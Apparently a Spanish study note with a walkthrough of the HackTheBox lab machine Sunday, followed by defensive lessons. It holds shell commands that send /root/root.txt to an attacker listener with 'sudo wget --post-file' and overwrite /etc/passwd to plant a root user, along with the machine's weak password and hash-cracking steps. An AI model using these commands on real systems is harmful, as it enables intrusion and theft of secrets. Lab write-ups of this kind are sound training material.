---
title: Sunday (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, solaris, finger, ssh, sudo, gtfobins, privesc, credenciales-debiles]
type: nota
status: en-progreso
source: claude-code
aliases: [Sunday HTB, HTB Sunday, sunday hackthebox]
---

# Sunday — HackTheBox (Easy)

**SO:** Solaris · **Dificultad:** Easy · **Skills:** enumeracion de usuarios con finger, SSH con credenciales debiles, lectura de shadow backup, crackeo de hashes, privesc via `sudo wget` (GTFOBins)

Sunday es una maquina Solaris clasica que introduce servicios legacy olvidados (finger) y demuestra como una cadena simple — enumeracion de usuarios, credenciales debiles y un permiso sudo mal otorgado — basta para comprometer un sistema completamente. Excelente para interiorizar el patron **finger → usuario valido → contrasena debil → sudo misconfiguration**.

> HTB es un laboratorio de ciberseguridad legal y autorizado; toda tecnica documentada aqui se aplica unicamente en entornos con permiso explicito.

---

## Objetivo

1. Enumerar usuarios del sistema Solaris mediante el servicio **finger** (puerto 79).
2. Obtener acceso SSH con credenciales debiles o crackeando un hash de `/backup/shadow.backup`.
3. Escalar privilegios aprovechando que `wget` puede ejecutarse como root via `sudo`.
4. Recuperar `user.txt` y `root.txt`.

---

## Acceso a la maquina (paso previo)

1. Descarga tu perfil VPN desde HTB (`.ovpn`) y conectate:
   ```bash
   sudo openvpn lab_<usuario>.ovpn
   ```
   Deja esa terminal abierta durante toda la sesion.

2. En la web de HTB, ve a **Labs → Machines → Sunday** y haz clic en **Spawn Machine**. La pagina te asignara una IP dinamica del tipo `10.10.10.x`.

3. Verifica conectividad:
   ```bash
   ping -c2 <IP>
   ```

4. Sustituye `<IP>` por la IP real que te asigne HTB en todos los comandos siguientes.

> **Nota:** Sunday es una maquina retirada — requiere suscripcion **VIP** para lanzarla. Si usas el **Pwnbox** (Kali en navegador), ya viene conectado a la VPN; omite el paso 1.

---

## Reconocimiento

**Categoria:** escaneo de puertos y deteccion de servicios en un sistema Solaris.

Solaris expone servicios que ya no son habituales en Linux moderno. El primer objetivo es identificar que esta corriendo.

```bash
nmap -sV -sC -p- --min-rate 5000 -oN sunday_full.txt <IP>
```

Resultado esperado (puertos relevantes):

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 79/tcp  | finger   | Solaris fingerd — enumeracion de usuarios |
| 22/tcp  | ssh      | SunSSH (Solaris) |
| 111/tcp | rpcbind  | RPC tipico de Solaris |
| 515/tcp | printer  | lpd / servicios de impresion Solaris |

El puerto **79 (finger)** es el hallazgo clave. Es un protocolo de los anos 80 que, en Solaris, permite preguntar al sistema por usuarios activos.

---

## Enumeracion

**Categoria:** enumeracion de usuarios via protocolo finger (RFC 1288).

### Finger manual

```bash
# Consulta general — lista usuarios conectados
finger @<IP>

# Consulta de un usuario concreto
finger root@<IP>
finger sammy@<IP>
finger sunny@<IP>
```

### Fuerza bruta de usuarios con finger-user-enum

Existe el script `finger-user-enum.pl` (incluido en Kali/Parrot) que prueba una wordlist contra el servicio finger:

```bash
finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <IP>
```

Tambien puedes usar el script NSE de nmap:

```bash
nmap -p 79 --script finger <IP>
```

**Resultado esperado:** el servicio confirmara que existen los usuarios `sammy` y `sunny` (o al menos uno de ellos) en el sistema.

> Los detalles exactos de salida pueden variar segun el estado de la maquina en vivo; lo importante es identificar nombres de usuario validos.

---

## Acceso inicial (foothold)

**Categoria:** autenticacion SSH con credenciales debiles + crackeo de hash desde backup de shadow.

Hay dos vias documentadas; ambas llegan a una shell como usuario no privilegiado.

### Via A — Credenciales debiles directas

Una vez identificados los usuarios, se prueba con contrasenas triviales. La combinacion clasica reportada en esta maquina es:

```bash
ssh sammy@<IP>
# contrasena: sunday
```

o bien:

```bash
ssh sunny@<IP>
# contrasena: sunday
```

Si funciona, ya tienes shell de usuario.

### Via B — Crackeo de /backup/shadow.backup

Con acceso de lectura (que puede obtenerse via el propio SSH si el primer usuario tiene permisos limitados, o directamente si el servicio lo expone), se lee el fichero:

```bash
cat /backup/shadow.backup
```

El fichero contiene hashes de contrasenas en formato shadow de Solaris/Unix. Se copian las lineas de los usuarios de interes y se crackean con John the Ripper:

```bash
# Guardar la linea del usuario en un fichero
echo 'sammy:<hash_aqui>:...' > shadow_backup.txt

# Crackeo con wordlist
john shadow_backup.txt --wordlist=/usr/share/wordlists/rockyou.txt
john shadow_backup.txt --show
```

John identificara la contrasena en texto claro. Con ella se accede por SSH.

> **Que hace John aqui:** prueba cada palabra de `rockyou.txt` aplicandole el mismo algoritmo de hash que usa el fichero shadow (crypt, MD5, SHA-512...) y compara con el hash almacenado. Cuando coincide, la contrasena es correcta. No hay magia: es fuerza bruta de diccionario.

**Flag de usuario:**

```bash
cat ~/user.txt
# <flag>   (ubicacion: /home/sammy/user.txt o /home/sunny/user.txt)
```

---

## Escalada de privilegios

**Categoria:** sudo misconfiguration — `wget` como root (GTFOBins).

### Inspeccion de permisos sudo

```bash
sudo -l
```

Salida esperada (para el usuario `sunny` o `sammy`, segun el caso):

```
User sunny may run the following commands on sunday:
    (root) NOPASSWD: /usr/bin/wget
```

**Patron:** el usuario puede ejecutar `wget` como root sin contrasena. `wget` tiene capacidad de escribir ficheros arbitrarios en el sistema — esto es una primitiva de escritura arbitraria como root.

### Explotacion — Exfiltracion de root.txt (lectura)

`wget` puede hacer peticiones a un servidor externo enviando el contenido de un fichero como POST. Desde la maquina victima:

```bash
# En tu maquina atacante, levanta un listener HTTP (elige un puerto)
nc -lvnp 8080

# En la maquina victima, usa sudo wget para enviar root.txt a tu listener
sudo wget --post-file=/root/root.txt http://<TU_IP_VPN>:8080/
```

El contenido de `/root/root.txt` llegara como cuerpo de la peticion HTTP a tu netcat.

### Explotacion alternativa — Sobrescribir /etc/passwd para obtener shell root

Esta via da shell interactiva como root. La idea es reemplazar `/etc/passwd` con una version modificada que incluya un usuario con UID 0 y contrasena conocida.

1. En tu maquina, descarga o crea un `/etc/passwd` modificado:
   ```bash
   # Copia el passwd de la victima (necesitas leerlo primero via otro metodo o wget)
   # Genera un hash para la nueva contrasena "hacked":
   openssl passwd -1 hacked
   # Salida: $1$xyz$...

   # Anade al final del fichero passwd una linea como:
   # pwned:$1$xyz$<hash>:0:0:root:/root:/bin/bash
   ```

2. Sirve el fichero modificado desde tu maquina:
   ```bash
   python3 -m http.server 8000
   ```

3. Desde la victima, descarga y sobrescribe `/etc/passwd` con sudo wget:
   ```bash
   sudo wget http://<TU_IP_VPN>:8000/passwd -O /etc/passwd
   ```

4. Ahora puedes hacer `su pwned` con la contrasena `hacked` y obtendras UID 0.

> **Por que funciona:** wget con `-O` escribe el fichero descargado en la ruta destino. Al ejecutarlo como root (via sudo), tiene permiso para sobrescribir cualquier fichero del sistema, incluidos los criticos de autenticacion.

---

## Flags

| Flag | Ubicacion | Como obtenerla |
|------|-----------|----------------|
| `user.txt` | `/home/sammy/user.txt` o `/home/sunny/user.txt` | Con shell SSH del usuario |
| `root.txt` | `/root/root.txt` | Via `sudo wget --post-file` o tras escalar a root |

```
user.txt → <flag>
root.txt → <flag>
```

---

## Patron y teoria

> Esta seccion es la mas importante del writeup: extrae el patron reutilizable y las implicaciones para disenar o defender sistemas.

### Cadena de ataque completa

```
finger (enumeracion de usuarios)
    ↓
usuario valido identificado (sammy / sunny)
    ↓
credencial debil / hash en backup expuesto
    ↓
SSH shell como usuario no privilegiado
    ↓
sudo -l → wget sin contrasena como root
    ↓
escritura arbitraria de ficheros → root
```

### Patron 1 — Servicios legacy expuestos (finger)

**Categoria:** superficie de ataque por servicios obsoletos.

Finger fue util en los 70-80 para redes universitarias cerradas. En 2024, exponer finger en internet equivale a publicar un directorio de usuarios del sistema. El protocolo no tiene autenticacion ni cifrado.

**Defensa:**
- Deshabilitar `fingerd` si no es necesario (en Solaris: `svcadm disable finger` o eliminar la entrada de `inetd.conf`).
- Regla general: audita con `nmap -sV` tu propio servidor. Si ves servicios que no reconoces o no necesitas, deshabilitarlos reduce la superficie.
- En diseno: nunca exponer servicios de administracion/informacion de usuarios a redes no confiables.

### Patron 2 — Credenciales debiles y backups de shadow expuestos

**Categoria:** gestion de credenciales y exposicion de material criptografico.

Dos fallos distintos que se refuerzan:
1. La contrasena `sunday` para el usuario `sammy`/`sunny` es trivial y aparece en cualquier diccionario.
2. Guardar una copia de `/etc/shadow` en `/backup/shadow.backup` con permisos de lectura para usuarios normales es un error de ACL critico: los hashes son material sensible equivalente a las contrasenas en si mismas.

**Defensa:**
- Politica de contrasenas: minimo 12 caracteres, complejidad, rotacion. En Solaris: `pam_pwquality` o `passwd` con politicas de `policy.conf`.
- Los backups de ficheros sensibles deben tener los mismos permisos (o mas restrictivos) que el original. `/etc/shadow` es `640 root:shadow`; su backup tambien.
- Nunca almacenar backups de shadow/passwd en rutas accesibles por usuarios no root.

### Patron 3 — sudo con binarios que tienen primitivas de fichero (GTFOBins)

**Categoria:** escalada de privilegios por sudo misconfiguration — clase GTFOBins.

Este es el patron mas importante para un desarrollador que diseña sistemas. El principio de minimo privilegio en sudo se viola cuando se permite ejecutar un binario que, aunque "no es una shell", tiene capacidad de leer o escribir ficheros arbitrarios.

`wget` puede:
- Descargar y escribir en cualquier ruta (`-O /ruta/sensible`)
- Enviar el contenido de cualquier fichero a un servidor externo (`--post-file`)

Otros binarios de GTFOBins con primitivas similares: `curl`, `cp`, `tee`, `dd`, `python`, `perl`, `vim`, `less`, `awk`, `find`...

**Defensa para desarrolladores y sysadmins:**
1. **Principio de minimo privilegio en sudo:** si un usuario necesita ejecutar un script concreto como root, da permiso solo a ese script (con ruta absoluta e inmutable), no al interprete.
2. **Audita con `sudo -l`** en todos tus sistemas. Cualquier binario listado debe verificarse en [GTFOBins](https://gtfobins.github.io/).
3. **Usa `sudoedit`** si lo que necesitas es editar un fichero como root, no dar acceso a un editor generico.
4. **Alternativas a sudo para tareas puntuales:** capabilities de Linux (`setcap`), systemd service units con `User=root` y `ExecStart` restringido, o politicas de SELinux/AppArmor.
5. **En diseno de pipelines CI/CD:** si un job necesita descargar artefactos, no le des sudo sobre wget; usa un usuario de servicio con permisos minimos sobre las rutas destino.

### Resumen del salto Starting Point → maquinas retiradas

Las maquinas de Starting Point aislan una vulnerabilidad por maquina. Sunday encadena tres: enumeracion de informacion (finger) + debilidad de autenticacion (contrasena/hash) + misconfiguracion de privilegios (sudo wget). El analista debe conectar los hallazgos en orden logico, no tratar cada servicio como un puzzle independiente.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[HTB_Starting_Point/00_README]]
- [[06-seguridad-de-sistemas-y-hardening]]
- [[13-herramientas-en-detalle]]
